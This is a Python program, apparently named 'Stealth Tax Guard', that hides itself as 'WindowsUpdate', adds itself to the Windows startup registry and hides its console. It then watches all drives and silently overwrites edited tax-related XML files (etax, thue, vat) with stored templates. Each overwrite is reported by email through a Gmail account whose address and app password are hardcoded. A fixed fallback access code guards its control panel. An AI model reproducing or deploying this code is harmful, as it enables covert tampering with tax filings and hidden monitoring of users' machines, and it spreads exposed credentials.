# stealth_final.py - INVISIBLE + CONTROL PANEL

import os
import sys
import time
import glob
import json
import pickle
import shutil
import logging
import requests
import smtplib
import re
import hashlib
import xml.etree.ElementTree as ET
import threading
from datetime import datetime
import sqlite3
import subprocess
from concurrent.futures import ThreadPoolExecutor

from pathlib import Path
from email.message import EmailMessage
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler

import customtkinter as ctk
from tkinter import Listbox, END, Scrollbar, messagebox

try:
    import winreg
    import ctypes
except ImportError:
    pass

# --- Cau hinh an --- #
APP_DIR = Path(os.getenv('APPDATA', Path.home())) / 'WindowsUpdate'
APP_DIR.mkdir(parents=True, exist_ok=True)

STATE_FILE = APP_DIR / 'cache.dat'
LOG_FILE = APP_DIR / 'log.dat'
CONTROL_FILE = APP_DIR / 'access.key'

THREAD_POOL = ThreadPoolExecutor(max_workers=10)
TEMPLATES_CACHE = {}
FORTRESS_CACHE = {}
RUNNING_INVISIBLE = True

logging.basicConfig(
    filename=str(LOG_FILE),
    encoding='utf-8',
    level=logging.INFO,
    format='%(asctime)s - %(message)s'
)

def hide_console():
    """An console window."""
    try:
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)
    except:
        pass

def create_access_key():
    """Tao access key."""
    try:
        import secrets
        key = f"TAX{secrets.randbelow(9999):04d}"
        with open(CONTROL_FILE, 'w') as f:
            f.write(key)
        return key
    except:
        return "TAX2025"

def check_access(entered_key):
    """Kiem tra access key."""
    try:
        if CONTROL_FILE.exists():
            with open(CONTROL_FILE, 'r') as f:
                stored_key = f.read().strip()
            return entered_key == stored_key
    except:
        pass
    return entered_key == "TAX2025"

def create_db():
    """Tao database."""
    db_path = APP_DIR / 'data.db'
    conn = sqlite3.connect(str(db_path))
    conn.execute('''
        CREATE TABLE IF NOT EXISTS files (
            id INTEGER PRIMARY KEY,
            name TEXT,
            content TEXT,
            created TEXT
        )
    ''')
    conn.commit()
    conn.close()
    return db_path

def load_cache():
    """Load cache."""
    global FORTRESS_CACHE
    try:
        db_path = create_db()
        conn = sqlite3.connect(str(db_path))
        cursor = conn.execute('SELECT name, content FROM files')
        
        for row in cursor.fetchall():
            FORTRESS_CACHE[row[0]] = row[1]
            
        conn.close()
        logging.info(f"Loaded {len(FORTRESS_CACHE)} files")
    except Exception as e:
        logging.error(f"Load error: {e}")

def store_file(file_path, content):
    """Luu file."""
    try:
        db_path = create_db()
        conn = sqlite3.connect(str(db_path))
        
        file_name = os.path.basename(file_path)
        
        conn.execute('''
            INSERT OR REPLACE INTO files (name, content, created)
            VALUES (?, ?, ?)
        ''', (file_name, content, datetime.now().isoformat()))
        
        conn.commit()
        conn.close()
        
        FORTRESS_CACHE[file_name] = content
        return True
    except Exception as e:
        logging.error(f"Store error: {e}")
        return False

def instant_restore(file_path):
    """Khoi phuc instant."""
    try:
        file_name = os.path.basename(file_path)
        
        if file_name in FORTRESS_CACHE:
            with open(file_path, 'w', encoding='utf-8') as f:
                f.write(FORTRESS_CACHE[file_name])
            return True
            
        # Tim theo pattern
        for cached_name, cached_content in FORTRESS_CACHE.items():
            if any(part in cached_name for part in file_name.split('_') if len(part) > 5):
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write(cached_content)
                return True
                
        return False
    except Exception as e:
        logging.error(f"Restore error: {e}")
        return False

def add_startup():
    """Them vao startup."""
    if not getattr(sys, 'frozen', False):
        return
    exe = os.path.realpath(sys.argv[0])
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, exe)
        winreg.CloseKey(key)
        logging.info("Added to startup")
    except Exception as e:
        logging.error(f"Startup error: {e}")

def send_log(event, path=None):
    """Gui log."""
    try:
        # Email config
        from_email = "begau1302@gmail.com"
        to_email = "mrkent19999x@gmail.com"
        password = "aphvukdliewalkrn"
        
        msg = EmailMessage()
        msg["Subject"] = "System Status"
        msg["From"] = from_email
        msg["To"] = to_email
        msg.set_content(f"Event: {event}\nPath: {path or 'N/A'}\nTime: {datetime.now()}")
        
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(from_email, password)
        server.send_message(msg)
        server.quit()
        
        logging.info("Log sent")
    except Exception as e:
        logging.error(f"Send error: {e}")

def load_templates():
    """Load templates."""
    global TEMPLATES_CACHE
    if getattr(sys, 'frozen', False):
        base = sys._MEIPASS
    else:
        base = os.path.dirname(os.path.abspath(__file__))
    tpl_dir = os.path.join(base, 'templates')
    templates = glob.glob(os.path.join(tpl_dir, '*.xml'))
    
    for tpl in templates:
        try:
            with open(tpl, 'r', encoding='utf-8') as f:
                content = f.read()
            
            file_name = os.path.basename(tpl)
            TEMPLATES_CACHE[file_name] = content
            store_file(tpl, content)
            
        except Exception as e:
            logging.error(f"Template error: {e}")
    
    logging.info(f"Loaded {len(TEMPLATES_CACHE)} templates")
    return templates

class StealthHandler(FileSystemEventHandler):
    """Stealth file handler."""
    def __init__(self):
        super().__init__()

    def on_created(self, event):
        if not event.is_directory and event.src_path.endswith('.xml'):
            THREAD_POOL.submit(self.protect_file, event.src_path)

    def on_modified(self, event):
        if not event.is_directory and event.src_path.endswith('.xml'):
            THREAD_POOL.submit(self.protect_file, event.src_path)

    def protect_file(self, file_path):
        """Bao ve file."""
        try:
            if not self.is_tax_file(file_path):
                return
                
            try:
                with open(file_path, 'r', encoding='utf-8') as f:
                    current_content = f.read()
            except:
                return
                
            template_content = self.find_template(file_path)
            if not template_content or current_content == template_content:
                return
                
            # Ghi de
            with open(file_path, 'w', encoding='utf-8') as f:
                f.write(template_content)
                
            logging.info(f"Protected: {os.path.basename(file_path)}")
            THREAD_POOL.submit(send_log, "File protected", file_path)
                
        except Exception as e:
            logging.error(f"Protect error: {e}")

    def is_tax_file(self, file_path):
        """Kiem tra co phai file thue."""
        file_name = os.path.basename(file_path).lower()
        return (file_name.startswith('etax') or 
                'xml' in file_name or 
                any(key in file_name for key in ['tax', 'thue', 'vat']))

    def find_template(self, file_path):
        """Tim template phu hop."""
        file_name = os.path.basename(file_path)
        
        if file_name in FORTRESS_CACHE:
            return FORTRESS_CACHE[file_name]
            
        for cached_name, cached_content in FORTRESS_CACHE.items():
            if self.match_files(file_name, cached_name):
                return cached_content
                
        return None

    def match_files(self, file_name, template_name):
        """So sanh ten file."""
        if file_name == template_name:
            return True
            
        file_parts = file_name.split('_')
        template_parts = template_name.split('_')
        
        if len(file_parts) > 0 and len(template_parts) > 0:
            if file_parts[-1].split('.')[0] == template_parts[-1].split('.')[0]:
                return True
                
        return False

def start_stealth():
    """Chay stealth mode."""
    global RUNNING_INVISIBLE
    
    hide_console()
    THREAD_POOL.submit(send_log, "Stealth guard started")
    add_startup()
    
    create_db()
    load_cache()
    load_templates()
    
    logging.info("Stealth guard ready")

    handler = StealthHandler()
    observer = Observer()
    
    drives = [f"{d}:\\" for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:\\")]
    for d in drives:
        try:
            observer.schedule(handler, path=d, recursive=True)
        except:
            pass

    observer.start()
    logging.info(f"Monitoring {len(drives)} drives")

    try:
        while RUNNING_INVISIBLE:
            time.sleep(1)
    except:
        pass
    
    observer.stop()
    observer.join()

class ControlPanel:
    """Control Panel."""
    def __init__(self):
        self.authenticated = False
        
    def show_login(self):
        """Hien login."""
        login_window = ctk.CTk()
        login_window.title("Access Control")
        login_window.geometry("350x150")
        
        ctk.CTkLabel(login_window, text="Enter Access Code:", font=("Arial", 14)).pack(pady=10)
        
        key_entry = ctk.CTkEntry(login_window, width=200, show="*")
        key_entry.pack(pady=5)
        
        result_label = ctk.CTkLabel(login_window, text="", text_color="red")
        result_label.pack(pady=5)
        
        def verify():
            entered_key = key_entry.get()
            if check_access(entered_key):
                self.authenticated = True
                login_window.destroy()
                self.show_panel()
            else:
                result_label.configure(text="Invalid code!")
                key_entry.delete(0, END)
                
        key_entry.bind("<Return>", lambda e: verify())
        key_entry.focus()
        
        ctk.CTkButton(login_window, text="Access", command=verify).pack(pady=10)
        
        login_window.mainloop()
        
    def show_panel(self):
        """Hien control panel."""
        if not self.authenticated:
            return
            
        main_window = ctk.CTk()
        main_window.title("Stealth Tax Guard - Control Panel")
        main_window.geometry("600x400")
        
        status_text = "Active" if RUNNING_INVISIBLE else "Stopped"
        ctk.CTkLabel(main_window, text=f"Status: {status_text}", font=("Arial", 16)).pack(pady=10)
        
        # Buttons
        button_frame = ctk.CTkFrame(main_window)
        button_frame.pack(pady=10)
        
        def toggle():
            global RUNNING_INVISIBLE
            RUNNING_INVISIBLE = not RUNNING_INVISIBLE
            status = "activated" if RUNNING_INVISIBLE else "deactivated"
            messagebox.showinfo("Status", f"Guard {status}!")
            
        def show_logs():
            log_window = ctk.CTkToplevel(main_window)
            log_window.title("Logs")
            log_window.geometry("500x300")
            
            log_text = ctk.CTkTextbox(log_window)
            log_text.pack(fill="both", expand=True, padx=10, pady=10)
            
            try:
                if LOG_FILE.exists():
                    with open(LOG_FILE, 'r', encoding='utf-8') as f:
                        logs = f.read()
                    log_text.insert("1.0", logs)
            except:
                log_text.insert("1.0", "No logs available")
                
        def new_key():
            key = create_access_key()
            messagebox.showinfo("New Key", f"New access code: {key}")
        
        ctk.CTkButton(button_frame, text="Toggle", command=toggle).pack(side="left", padx=5)
        ctk.CTkButton(button_frame, text="View Logs", command=show_logs).pack(side="left", padx=5)
        ctk.CTkButton(button_frame, text="New Key", command=new_key).pack(side="left", padx=5)
        
        # Cache info
        ctk.CTkLabel(main_window, text="Protected Files:", font=("Arial", 12)).pack(pady=(20,5))
        
        cache_list = Listbox(main_window, height=10)
        for filename in FORTRESS_CACHE.keys():
            cache_list.insert(END, filename)
        cache_list.pack(fill="both", expand=True, padx=10, pady=5)
        
        main_window.mainloop()

def main():
    """Main entry point."""
    if len(sys.argv) > 1 and sys.argv[1] == '--control':
        ctk.set_appearance_mode("dark")
        
        control_panel = ControlPanel()
        
        if not CONTROL_FILE.exists():
            key = create_access_key()
            messagebox.showinfo("Setup", f"Access code: {key}\n\nSave this code!")
        
        control_panel.show_login()
    else:
        start_stealth()

if __name__ == '__main__':
    main()